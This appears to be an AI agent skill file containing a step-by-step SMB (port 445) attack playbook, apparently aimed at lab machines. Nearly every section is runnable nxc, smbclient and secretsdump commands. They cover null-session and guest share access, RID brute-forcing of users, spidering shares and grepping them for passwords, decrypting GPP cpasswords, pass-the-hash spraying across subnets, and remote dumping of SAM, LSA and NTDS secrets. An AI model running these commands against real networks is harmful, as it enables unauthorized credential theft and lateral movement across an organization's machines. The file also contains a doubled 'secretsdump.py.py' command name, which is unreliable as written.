---
name: smb
description: Enumerate and exploit SMB (port 445). Use when port 445 is open. Covers null sessions, share access, RID brute, SMB spider, GPP/SYSVOL, credential hunting in shares, local admin reuse, SMB signing check for relay.
user-invocable: false
allowed-tools: Read
---

# SMB — Port 445

## Step 1 — signing check (always first, needed for relay decisions)
```bash
nxc smb {IP}                                           # shows signing: True/False and SMBv1
nxc smb {IP}/24                                        # subnet sweep
```
- **Signing: False** → target is relay candidate (ntlmrelayx, responder)
- **SMBv1: True** → EternalBlue possible if unpatched (rare on HTB but check)

## Step 2 — null / guest session
```bash
nxc smb {IP} -u '' -p '' --shares                     # pure null session
nxc smb {IP} -u 'a' -p '' --shares                    # some DCs need any username
nxc smb {IP} -u 'guest' -p '' --shares                # guest account
smbclient -L //{IP} -N                                    # list shares null
smbclient -L //{IP} -U 'guest%'                           # guest
```
Null session working = open LDAP/RPC likely too. Chain these.

## Step 3 — RID brute (user enumeration without creds)
```bash
nxc smb {IP} -u '' -p '' --rid-brute                  # default range 500-4000
nxc smb {IP} -u '' -p '' --rid-brute 500-2000
nxc smb {IP} -u 'a' -p '' --rid-brute                 # if null fails
```
Save the user list — needed for AS-REP roast, kerbrute, spraying.

## Step 4 — authenticated enumeration (once you have creds)
```bash
nxc smb {IP} -u '{USER}' -p '{PASS}' --shares
nxc smb {IP} -u '{USER}' -H {NT_HASH} --shares
nxc smb {IP} -u '{USER}' -p '{PASS}' --users          # domain users via samrpc
nxc smb {IP} -u '{USER}' -p '{PASS}' --groups
nxc smb {IP} -u '{USER}' -p '{PASS}' --sessions       # active sessions (high-value targets logged in?)
nxc smb {IP} -u '{USER}' -p '{PASS}' --loggedon-users
nxc smb {IP} -u '{USER}' -p '{PASS}' --pass-pol       # lockout policy BEFORE spraying
```

## Step 5 — spider shares (find sensitive files)
```bash
nxc smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus                    # spider all shares
nxc smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus -o READ_ONLY=False # also read content

# Manual browsing
smbclient //{IP}/{SHARE} -U '{DOMAIN}/{USER}%{PASS}'
smbclient //{IP}/{SHARE} -U '{USER}%{PASS}'
# Inside smbclient: recurse ON; prompt OFF; mget *
```

Look for:
- `web.config`, `appsettings.json`, `*.config` → connection strings, passwords
- `*.ps1`, `*.bat`, `*.cmd`, `*.vbs` → scripts with hardcoded creds
- `*.ini`, `*.conf`, `*.xml` → service configs
- `id_rsa`, `*.pem`, `*.pfx`, `*.p12` → private keys / certificates
- `*.kdbx` → KeePass databases
- `*.xlsx`, `*.docx`, `*.txt` → password lists, admin notes

```bash
# Quick grep after downloading shares
grep -riE '(password|passwd|pwd|secret|connectionstring|apikey)\s*[=:]' . \
  --include='*.xml' --include='*.config' --include='*.json' \
  --include='*.ps1' --include='*.bat' --include='*.ini' -l
```

## Step 6 — SYSVOL / GPP passwords
Group Policy Preferences stored AES-encrypted passwords in SYSVOL. Microsoft published the key in 2012.
```bash
# Automated
nxc smb {IP} -u '{USER}' -p '{PASS}' -M gpp_password
nxc smb {IP} -u '{USER}' -p '{PASS}' -M gpp_autologin

# Manual
smbclient //{IP}/SYSVOL -U '{DOMAIN}/{USER}%{PASS}' -c 'recurse ON; prompt OFF; mget *'
grep -r 'cpassword' ./ --include='*.xml'
gpp-decrypt '{CPASSWORD}'                                  # decrypt the cpassword value

# Also check NETLOGON share for logon scripts
smbclient //{IP}/NETLOGON -U '{DOMAIN}/{USER}%{PASS}' -c 'recurse ON; prompt OFF; mget *'
grep -riE '(password|pass|pwd)' . --include='*.ps1' --include='*.bat' --include='*.cmd'
```
**Any domain account can read SYSVOL. GPP creds are often reused elsewhere.**

## Step 7 — local admin reuse / password spray across machines
```bash
# Test found hash / password against all machines (local admin account)
nxc smb {SUBNET}/24 -u administrator -H {NT_HASH} --local-auth
nxc smb {SUBNET}/24 -u administrator -p '{PASS}' --local-auth
nxc smb {SUBNET}/24 -u '{USER}' -H {NT_HASH} --local-auth

# Find machines where domain account is local admin
nxc smb {SUBNET}/24 -u '{USER}' -p '{PASS}'

# Dump SAM from any machine with local admin
nxc smb {TARGET_IP} -u administrator -H {NT_HASH} --local-auth --sam
nxc smb {TARGET_IP} -u '{USER}' -p '{PASS}' --sam
```
**Same NT hash often works across all machines deployed from the same image.**

## Step 8 — dump secrets remotely (if local admin on machine)
```bash
nxc smb {IP} -u '{USER}' -p '{PASS}' --sam            # SAM hashes (local accounts)
nxc smb {IP} -u '{USER}' -p '{PASS}' --lsa            # LSA secrets (service account creds)
nxc smb {IP} -u '{USER}' -p '{PASS}' --ntds           # NTDS.dit (DC only, DA needed)
secretsdump.py.py {DOMAIN}/{USER}:'{PASS}'@{IP}              # all secrets at once
secretsdump.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
```

## Gotchas
- **Null session fails with empty username** → try `-u 'a' -p ''` (some DCs require any username)
- **SMB signing True** → relay attacks blocked; still enumerate, just can't relay
- **SMBv1** → check EternalBlue (MS17-010) with `nxc smb {IP} -M ms17-010`
- **READ_ONLY=False on spider_plus** → downloads files, can be noisy
- **GPP cpassword** → always decrypt and test on all services, often reused domain-wide
- **Password spraying** → check `--pass-pol` first; default lockout is 5 attempts
- **NETLOGON scripts** → easy miss; always check for hardcoded creds in .bat/.ps1
- **Active sessions** → high-value users logged in = good relay target, or cred hunting via DPAPI
